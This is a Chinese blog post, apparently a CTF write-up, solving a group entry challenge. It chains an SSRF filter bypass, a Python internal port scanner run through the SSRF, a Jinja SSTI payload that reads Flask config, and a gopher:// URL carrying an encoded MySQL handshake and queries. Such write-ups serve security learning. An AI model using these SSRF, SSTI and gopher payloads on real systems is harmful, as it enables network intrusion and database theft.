@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="关于某CTF交流群的入群题Orz。 换新题了，可以发了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于某CTF交流群的入群题">
+<meta property="og:url" content="https://southsea.st/Daily-CTF-Group-Question-4/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="关于某CTF交流群的入群题Orz。 换新题了，可以发了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-01-30T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.072Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="GOPHER">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/Daily-CTF-Group-Question-4/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/Daily-CTF-Group-Question-4/","path":"Daily-CTF-Group-Question-4/","title":"关于某CTF交流群的入群题"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>关于某CTF交流群的入群题 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/Daily-CTF-Group-Question-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="关于某CTF交流群的入群题 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于某CTF交流群的入群题
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-01-30 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-30T00:00:00+00:00">2019-01-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>关于某<strong>CTF</strong>交流群的入群题<strong>Orz</strong>。</p>
+<p>换新题了，可以发了。</p>
+<span id="more"></span>
+<p><strong>Emmm</strong>直接上题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>构造<strong>/?url=http://<span class="citation"
+data-cites="127.0.0.1">@127.0.0.1</span>.:80/flag.php</strong>可以绕过，提示<strong>string(15)
+"172.11.243.0/24"</strong>，应该是要扫内网。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line">threads_count = <span class="number">10</span></span><br><span class="line">que = Queue.Queue()</span><br><span class="line">threads = []</span><br><span class="line">lock = threading.Lock()</span><br><span class="line">ports = [<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">69</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">110</span>,<span class="number">389</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">488</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">514</span>,<span class="number">873</span>,<span class="number">901</span>,<span class="number">1043</span>,<span class="number">1080</span>,<span class="number">1099</span>,<span class="number">1090</span>,<span class="number">1158</span>,<span class="number">1352</span>,<span class="number">1433</span>,</span><br><span class="line">         <span class="number">1434</span>,<span class="number">1521</span>,<span class="number">2049</span>,<span class="number">2100</span>,<span class="number">2181</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">3306</span>,<span class="number">3307</span>,<span class="number">3389</span>,<span class="number">4440</span>,<span class="number">4444</span>,<span class="number">4445</span>,<span class="number">4848</span>,<span class="number">5000</span>,<span class="number">5280</span>,<span class="number">5432</span>,<span class="number">5500</span>,<span class="number">5632</span>,<span class="number">5900</span>,<span class="number">5901</span>,</span><br><span class="line">         <span class="number">5902</span>,<span class="number">5903</span>,<span class="number">5984</span>,<span class="number">6000</span>,<span class="number">6033</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">6666</span>,<span class="number">7001</span>,<span class="number">7001</span>,<span class="number">7002</span>,<span class="number">7070</span>,<span class="number">7101</span>,<span class="number">7676</span>,<span class="number">7777</span>,<span class="number">7899</span>,<span class="number">7988</span>,<span class="number">8000</span>,<span class="number">8001</span>,<span class="number">8002</span>,<span class="number">8003</span>,<span class="number">8004</span>,</span><br><span class="line">         <span class="number">8005</span>,<span class="number">8006</span>,<span class="number">8007</span>,<span class="number">8008</span>,<span class="number">8009</span>,<span class="number">8069</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,<span class="number">8085</span>,<span class="number">8086</span>,<span class="number">8087</span>,<span class="number">8088</span>,<span class="number">8089</span>,<span class="number">8090</span>,<span class="number">8091</span>,<span class="number">8092</span>,<span class="number">8093</span>,<span class="number">8094</span>,<span class="number">8095</span>,</span><br><span class="line">         <span class="number">8098</span>,<span class="number">8099</span>,<span class="number">8980</span>,<span class="number">8990</span>,<span class="number">8443</span>,<span class="number">8686</span>,<span class="number">8787</span>,<span class="number">8880</span>,<span class="number">8888</span>,<span class="number">9000</span>,<span class="number">9001</span>,<span class="number">9043</span>,<span class="number">9045</span>,<span class="number">9060</span>,<span class="number">9080</span>,<span class="number">9081</span>,<span class="number">9088</span>,<span class="number">9088</span>,<span class="number">9090</span>,<span class="number">9091</span>,<span class="number">9100</span>,<span class="number">9200</span>,</span><br><span class="line">         <span class="number">9300</span>,<span class="number">9443</span>,<span class="number">9871</span>,<span class="number">9999</span>,<span class="number">10000</span>,<span class="number">10068</span>,<span class="number">10086</span>,<span class="number">11211</span>,<span class="number">20000</span>,<span class="number">22022</span>,<span class="number">22222</span>,<span class="number">27017</span>,<span class="number">28017</span>,<span class="number">50060</span>,<span class="number">50070</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    que.put(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">while</span> que.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">        num = que.get()</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                addr = <span class="string">&quot;172.11.243.&#123;num&#125;:&#123;port&#125;&quot;</span>.<span class="built_in">format</span>(num = num, port = port)</span><br><span class="line">                <span class="built_in">print</span> addr</span><br><span class="line">                url = <span class="string">&quot;http://ctf473831530.yulige.top:12345/?url=http://&quot;</span> + addr</span><br><span class="line">                r = requests.get(url, timeout = <span class="number">2.8</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;bool(false)&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span> addr + <span class="string">&quot; is Open&quot;</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                lock.acquire()</span><br><span class="line">                lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads_count):</span><br><span class="line">    t = threading.Thread(target = run)</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> que.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">    time.sleep(<span class="number">1.0</span>)</span><br></pre></td></tr></table></figure>
+<p>然后扫到了<strong>172.11.243.81:8080</strong>，访问得到如下代码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;HINT&#x27;</span>] = os.environ.pop(<span class="string">&#x27;HINT&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/yulige/&lt;path:yulige&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">yulige</span>(<span class="params">yulige</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(yulige))</span><br><span class="line">    &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+<p>根据提示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://172.11.243.81:8080/yulige/&#123;&#123;get_flashed_messages.globals[%27current_app%27].config[%27HINT%27]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后得到提示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(29) &quot;mysql_user_is_yuligeeee123321&quot;</span><br></pre></td></tr></table></figure>
+<p>看来是需要使用<strong>Gopher</strong>协议对数据库进行操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf473831530.yulige.top:12345/?url=gopher://localhost:80@172.11.243.218:3306/_%25b3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%256b%2503%255f%256f%2573%250a%256d%2561%2563%256f%2573%2531%2530%252e%2531%2534%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2535%2530%2536%2531%2534%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2535%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2521%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256f%256e%255f%2563%256f%256d%256d%2565%256e%2574%2520%256c%2569%256d%2569%2574%2520%2531%2512%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2544%2541%2554%2541%2542%2541%2553%2545%2528%2529%250c%2500%2500%2500%2502%2566%256c%2561%2534%2534%2534%2531%2531%2531%2531%2567%250f%2500%2500%2500%2503%2573%2568%256f%2577%2520%2564%2561%2574%2561%2562%2561%2573%2565%2573%250c%2500%2500%2500%2503%2573%2568%256f%2577%2520%2574%2561%2562%256c%2565%2573%251d%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2546%2531%2531%2531%2531%256c%256c%256c%256c%2567%2567%2567%2567%2567%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/SSRF/" rel="tag"><i class="fa fa-tag"></i> SSRF</a>
+              <a href="/tags/SSTI/" rel="tag"><i class="fa fa-tag"></i> SSTI</a>
+              <a href="/tags/GOPHER/" rel="tag"><i class="fa fa-tag"></i> GOPHER</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018-BYB-Preliminary/" rel="prev" title="2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解">
